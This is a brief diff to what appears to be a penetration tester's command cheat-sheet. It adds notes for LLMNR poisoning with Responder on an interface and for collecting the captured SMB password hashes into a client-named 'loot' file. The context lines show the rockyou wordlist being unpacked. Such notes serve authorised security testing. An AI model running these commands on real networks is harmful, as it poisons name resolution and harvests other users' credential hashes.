@@ -104,3 +104,7 @@ gitter
 
 # admin - unzip a file
 sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+
+# active directory - LLMNR poisoning - grabbing hashes with responder
+sudo responder -I eth0 -rdw
+cat /usr/share/responder/logs/SMB* > loot/[CLIENT].hashes
